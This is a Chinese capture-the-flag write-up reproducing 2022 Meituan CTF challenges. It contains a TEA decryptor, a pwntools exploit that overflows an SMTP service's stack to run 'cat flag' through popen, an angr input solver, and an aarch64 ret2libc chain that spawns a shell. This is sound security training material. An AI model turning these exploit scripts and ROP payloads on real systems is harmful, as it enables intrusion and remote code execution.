# 2022美团CTF复现-TokameinE

## RE

### small

题目本身不难，也没什么内容。但是我似乎没办法在本地运行它，并且也没办法反编译，所以只能静态分析汇编代码逻辑了。

IDA 打开以后没有识别到代码，所以手动将所有数据反编译以后筛出代码部分就能找到主要逻辑了。

不过代码似乎还加了花指令，我自己懒得手动 patch 中间的内容了，就纯读汇编代码。不过好在程序确实很小，中心逻辑非常少，tea 加密的相关汇编代码总共还没 30 行估计，马上就能看出来，然后写一些解密就行了：

```c
#include<stdio.h>
#include<stdlib.h>
#include <cstdint>
void decrypt(uint32_t* v, uint32_t* k) {
    uint32_t v0 = v[0], v1 = v[1], sum = 0x67452301 * 35, i;
    uint32_t delta = 0x67452301;
    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];
    for (i = 0; i < 35; i++) {
        v1 -= ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
        v0 -= ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
        sum -= delta;
    }
    v[0] = v0;
    v[1] = v1;
}

int main()
{
	unsigned char ida_chars1[] =
	{
		0x43, 0x71, 0x08, 0xDE, 0xD2, 0x1B, 0xF9, 0xC4, 0xDC, 0xDA,
		0xF6, 0xDA, 0x4C, 0xD5, 0x9E, 0x6D, 0xE7, 0x4E, 0xEB, 0x75,
		0x04, 0xDC, 0x1D, 0x5D, 0xD9, 0x0F, 0x1B, 0x51, 0xFB, 0x88,
		0xDC, 0x51
	};
	uint32_t ida_chars[8];
	for (int i = 0; i < 8; i++)
	{
		ida_chars[i] = *((uint32_t*)ida_chars1 + i);
	}
	uint32_t key[4] = { 0x1,0x23,0x45,0x67 };
	decrypt(ida_chars, key);
	decrypt(ida_chars+2, key);
	decrypt(ida_chars + 4, key);
	decrypt(ida_chars + 6, key);
	char* k = (char*)ida_chars;
	for (int i = 0; i < 32; i++)
	{
	printf("%c", *(k + i));
	}
}
```

### static

没复现，看了一下发现是 aes+xxtea ，另外还有 z3 解方程什么的，感觉分析量很大，已经超出 pwn 手的需求范围了，就没复现了。

## PWN

### SMTP

比赛的时候没能做出来，当时一直懒得去调试这道题，所以到最后都没验证漏洞是否存在，然后在赛后陷入无尽的后悔，寄。

关键代码其实并不大，哪怕是走 fuzz 都应该能找到溢出点：

```c
void *__cdecl sender_worker(const char **a1)
{
  char s[256]; // [esp+Ch] [ebp-10Ch] BYREF
  const char **v3; // [esp+10Ch] [ebp-Ch]

  puts("sender: starting work");
  v3 = a1;
  len = strlen(a1[1]);
  puts("sender: sending message....");
  printf("sender: FROM: %s\n", *a1);
  if ( strlen(*a1) <= 0x4F )
    strcpy(from, *v3);
  if ( len <= 0xFFu )
  {
    printf("sender: TO: %s\n", v3[1]);
  }
  else
  {
    memset(s, 0, sizeof(s));
    strcpy(s, v3[1]);// <--------------溢出
    printf("sender: TO: %s\n", s);
  }
  puts("sender: BODY:");
  if ( v3[2] )
    printf("%s", v3[2]);
  else
    puts("No body.");
  putchar(10);
  puts("sender: finished");
  return 0;
}
```

可以明显的看出，在调用 `strcpy` 时并没有检查字符串的长度，如果 `v3[1]` 的长度超过了 256 就能造成栈溢出了。

先检查一下程序的保护：

```c
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

没有 PIE 的情况下，栈溢出能直接写 ROP 劫持程序流了，因此向上去跟一下 `v3[1]` 的源头：

```c
int __cdecl session_submit(_DWORD *a1)
{
  pthread_t newthread[2]; // [esp+Ch] [ebp-Ch] BYREF

  printf("session %d: received message '%s'\n", *a1, *(a1[4] + 8));
  printf("session %d: handing off message to sender\n", *a1);
  return pthread_create(newthread, 0, sender_worker, a1[4]);
}
```

最后根据参数可以确定出这段内容：

```c
          case 2:
            if ( v35[1] != 2 && v35[1] != 3 )
              goto LABEL_41;
            v35[1] = 3;
            v14 = v35[4];
            *(v14 + 4) = strdup(*(ptr + 1));
            v15 = strlen(server_replies[0]);
            send(fd, server_replies[0], v15, 0);
            printf("session %d: state changed to got receipients\n", fd);
            break;
```

此处它将 `RCPT TO:` 后的数据放入到 `*(v14 + 4)` 处，我们用一段很长的数据来测试一下是否会引发崩溃：

```python
from pwn import *

p = remote('127.0.0.1',9999)
elf=ELF("./pwn")
p.sendafter('220 SMTP tsmtp\n','HELO toka')
p.sendafter('250 Ok\n',"MAIL FROM:toka")
p.sendafter("250 Ok\n",b"RCPT TO:"+b"a"*0x104)
p.sendafter('250 Ok\n','DATA')
p.sendafter(".<CR><LF>\n",b".\r\n" + b"fxxk")

p.interactive()
```

而在服务端那边，我们确实成功触发了 `core dump` ：

```c
sender: TO: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
sender: BODY:
Segmentation fault (core dumped)
```

那么接下来就是构造 ROP 把 flag 带出来了：

```python
from pwn import *

p = remote('127.0.0.1',9999)
elf=ELF("./pwn")
p.sendafter('220 SMTP tsmtp\n','HELO toka')
p.sendafter('250 Ok\n',"MAIL FROM:cat flag >&5;r\x00")

payload=b"a"*0x100+p32(0x804d1d0)+b'a'*0xc+p32(elf.plt["popen"])+b'dead'+p32(0x804d140)+p32(0x804d14c+1)
p.sendafter("250 Ok\n",b"RCPT TO:"+payload)
p.sendafter('250 Ok\n','DATA')
p.sendafter(".<CR><LF>\n",b".\r\n" + b"fxxk")

p.interactive()
```

看了一下其他师傅的 wp，发现它们不是通过 OR+Send 的链条写回 flag，而是通过 popen 执行 `cat flag>&5` 来直接执行指令，并将该指令的输出绑定到 fd=5，这确实比构造很长了 ROP 要来的优雅。

另外，由于程序是 32 位的，一些数据是通过栈进行传参的，比方说：

```c
  if ( v3[2] )
    printf("%s", v3[2]);
```

它对应的汇编如下：

```c
.text:08049AC8 8B 45 F4                      mov     eax, [ebp-0x0c]
.text:08049ACB 8B 40 08                      mov     eax, [eax+8]
.text:08049ACE 85 C0                         test    eax, eax
.text:08049AD0 74 1B                         jz      short loc_8049AED
```

如果在 `strcpy` 处覆盖返回地址，还需要保证 `ebp-0x0c` 处的内存能够访问，否则会引发崩溃。

### 捉迷藏

去年的 SCTF2021 遇到了一道名为 `ret2text` 的题目，和这题非常相似，都是程序体积较大，执行流较多，输入也挺多的，而且每个分支前面还有各自各样的运算和判断，即便找到了溢出点，也会苦于不知道该如何输入才能让程序走到那里。

而这次的题目和 SCTF 还不太一样，它的附件不会变化，因此如果不嫌麻烦，手算一下输入或许也能搞定，但 SCTF 的时候，每次 nc 过去的附件都不一样，而且超过一定世界会自动断连，所以必须要用自动化分析工具在一次连接内搞定。

由于程序的输入很多，为了加快进度可以写一下函数 hook 来替换输入：

```python
class ReplacementCheckEquals(angr.SimProcedure):
    def run(self, str1, str2):
        cmp1 = angr_load_str(self.state, str2).encode("ascii")
        cmp0 = self.state.memory.load(str1, len(cmp1))
        self.state.regs.rax = claripy.If(cmp1 == cmp0, claripy.BVV(0, 32), claripy.BVV(1, 32))

class ReplacementCheckInput(angr.SimProcedure):
    def run(self, buf, len):
        len = self.state.solver.eval(len)
        self.state.memory.store(buf, getBVV(self.state, len))

class ReplacementInputVal(angr.SimProcedure):
    def run(self):
        self.state.regs.rax = getBVV(self.state, 4, 'int')


p.hook_symbol("fksth", ReplacementCheckEquals())
p.hook_symbol("input_line", ReplacementCheckInput())
p.hook_symbol("input_val", ReplacementInputVal())
```

angr 中的函数钩子模板如上，`claripy.BVV(0, 32)` 是用来生成向量符号的，相当于一个变量，第一个为变量名，第二个参数为变量的长度。

`self.state.regs.rax` 则是用来设置寄存器数据的，因为函数的返回值由 `rax` 寄存器保存，因此将结果写入 `self.state.regs.rax` 。

其他部分懒得写了，angr 姑且有 python 的语法结构，至少从语义上不难理解，细节可能要等以后学过 angr 才能看了。

```python
from pwn import *
import angr
import claripy
import base64
ret_rop = 0x4013C8

r=process("./pwn")

p = angr.Project("./pwn")

def getBVV(state, sizeInBytes, type = 'str'):
    global pathConditions
    name = 's_' + str(state.globals['symbols_count'])
    bvs = claripy.BVS(name, sizeInBytes * 8)
    state.globals['symbols_count'] += 1
    state.globals[name] = (bvs, type)
    return bvs

def angr_load_str(state, addr):
    s, i = '', 0
    while True:
        ch = state.solver.eval(state.memory.load(addr + i, 1))
        if ch == 0: break
        s += chr(ch)
        i += 1
    return s

class ReplacementCheckEquals(angr.SimProcedure):
    def run(self, str1, str2):
        cmp1 = angr_load_str(self.state, str2).encode("ascii")
        cmp0 = self.state.memory.load(str1, len(cmp1))
        self.state.regs.rax = claripy.If(cmp1 == cmp0, claripy.BVV(0, 32), claripy.BVV(1, 32))

class ReplacementCheckInput(angr.SimProcedure):
    def run(self, buf, len):
        len = self.state.solver.eval(len)
        self.state.memory.store(buf, getBVV(self.state, len))

class ReplacementInputVal(angr.SimProcedure):
    def run(self):
        self.state.regs.rax = getBVV(self.state, 4, 'int') 


p.hook_symbol("fksth", ReplacementCheckEquals())
p.hook_symbol("input_line", ReplacementCheckInput())
p.hook_symbol("input_val", ReplacementInputVal())

enter = p.factory.entry_state()
enter.globals['symbols_count'] = 0
simgr = p.factory.simgr(enter, save_unconstrained=True)
d = simgr.explore()
backdoor = p.loader.find_symbol('backdoor').rebased_addr
for state in d.unconstrained:
    bindata = b''
    rsp = state.regs.rsp
    next_stack = state.memory.load(rsp, 8, endness=p.arch.memory_endness)
    state.add_constraints(state.regs.rip == ret_rop)
    state.add_constraints(next_stack == backdoor)
    for i in range(state.globals['symbols_count']):
        s, s_type = state.globals['s_' + str(i)]
        if s_type == 'str':
            bb = state.solver.eval(s, cast_to=bytes)
            if bb.count(b'\x00') == len(bb):
                bb = b'A' * bb.count(b'\x00')
            bindata += bb
            print(bb)
        elif s_type == 'int':
            bindata += str(state.solver.eval(s, cast_to=int)).encode('ASCII') + b' '
            print(str(state.solver.eval(s, cast_to=int)).encode('ASCII') + b' ')
    print(bindata)
    gdb.attach(r,"b*0x4079D7")
    r.send(bindata)
    r.interactive()
    break
```

### ret2libc_aarch64

题目本身没有难点，一个任意地址泄露和一个无限栈溢出，但问题在于，程序是 aarch64 指令集，没学过这一套，加上需要 qemu 运行，不知道该怎么调试程序。

这里介绍一个能够通过 python 脚本交互的调试方案：

在 python 脚本里通过 `qemu-aarch64 -g 1234 ./pwn` 来启一个端口服务，此时该服务就会开始等待 gdb 连接：

```python
from pwn import *
context(os = "linux", arch = 'aarch64', log_level = 'debug')
libc = ELF('./libc.so.6')
file = './pwn'
elf = ELF(file)

p = process('qemu-aarch64 -g 1234 ./pwn', shell=True)
p.recvuntil('>\n')

io.interactive()
shell()
```

接下来另外启一个 shell：

```sh
$ gdb-multiarch ./pwn
pwndbg> b *0x4009A0
pwndbg> target remote:1234
```

然后这个 shell 中的 gdb 就会连接到 python 脚本中启动的服务上，然后其他过程正常调试即可。


另外一个点是，aarch64 平台下，函数返回值储存在 X30 寄存器中，这个寄存器在 GDB 中不会直接显示在上方的寄存器组中：

```c
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 X0   0xb
 X1   0x40009bc5c0 ◂— 0x0
 X2   0xfbad2887
 X3   0x40009bf500 ◂— 0x0
 X4   0x10
 X5   0x8080808080800000
 X6   0xfefefefefeff3d3d
 X7   0x7f7f7f7f7f7f7f7f
 X8   0x40
 X9   0x5
 X10  0xa
 X11  0xffffffffffffffff
 X12  0x400084fe48 ◂— 0x0
 X13  0x0
 X14  0x0
 X15  0x6fffff47
 X16  0x1
 X17  0x40008b1928 (puts) ◂— stp    x29, x30, [sp, #-0x40]!
 X18  0x73516240
 X19  0x4009b8 (__libc_csu_init) ◂— stp    x29, x30, [sp, #-0x40]!
 X20  0x0
 X21  0x4006f0 (_start) ◂— movz   x29, #0
 X22  0x0
 X23  0x0
 X24  0x0
 X25  0x0
 X26  0x0
 X27  0x0
 X28  0x0
 X29  0x40007ffdd0 —▸ 0x40007ffdf0 ◂— 0x0
 SP   0x40007ffdd0 —▸ 0x40007ffdf0 ◂— 0x0
*PC   0x400948 (overflow) ◂— stp    x29, x30, [sp, #-0x90]!
```

需要通过 `info reg x30` 查看具体值：

```c
pwndbg> info reg x30
x30            0x400864            4196452
```

其中重点需要关注的质量是：

`LDP x29, x30, [sp], #0x40`：将`sp`弹栈到`x29`，`sp+0x8`弹栈到`x30`，最后`sp += 0x40`。

`STP x4, x5, [sp, #0x20]`：将`sp+0x20`处依次覆盖为`x4，x5`，即`x4`入栈到`sp+0x20`，`x5`入栈到`sp+0x28`，最后`sp`的位置不变。

可以注意到，程序会将栈中的数据写入到 x30 寄存器来修改返回值，这意味栈溢出仍然能够劫持执行流。


然后就是漫长的调试去通过 ROP 确定返回劫持控制流了：这里直接用了 Nirvana 师傅的 ROP 链

```python
from pwn import *
context(os = "linux", arch = 'aarch64', log_level = 'debug')
libc = ELF('./libc.so.6')
file = './pwn'
elf = ELF(file)

local = 1
if local:
	io = process('qemu-aarch64 -g 1234 ./pwn', shell=True)
else:
	io = remote('39.106.76.68',30154)

r = lambda : io.recv()
rx = lambda x: io.recv(x)
ru = lambda x: io.recvuntil(x)
rud = lambda x: io.recvuntil(x, drop=True)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda x, y: io.sendafter(x, y)
sla = lambda x, y: io.sendlineafter(x, y)
li = lambda name,x : log.info(name+':'+hex(x))
shell = lambda : io.interactive()

ru('>\n')
s('1')
ru('sensible>>\n')
s(p64(elf.got['puts']))
libcbase = u64(rx(3).ljust(8,b'\x00')) + 0x4000000000 - libc.sym['puts']
li('libcbase',libcbase)

ru('>\n')
s('2')
ru('sensible>>\n')
#padding 136
system = libcbase + libc.sym['system']
bin_sh = libcbase + next(libc.search(b'/bin/sh\x00'))
gadget1_addr=libcbase + 0x72450
gadget2_addr=libcbase + 0x72448
payload = p64(gadget2_addr)*2 + b'a'*0x78 + p64(gadget1_addr)+ p64(gadget2_addr)*7+p64(bin_sh) + p64(system)*5
io.sendline(payload)
io.send('3')
io.interactive()
shell()
```

### note

这题倒是没啥难度，当时起床晚了看了一下题目，leof 师傅三下五除二就搞出来了就没继续看了。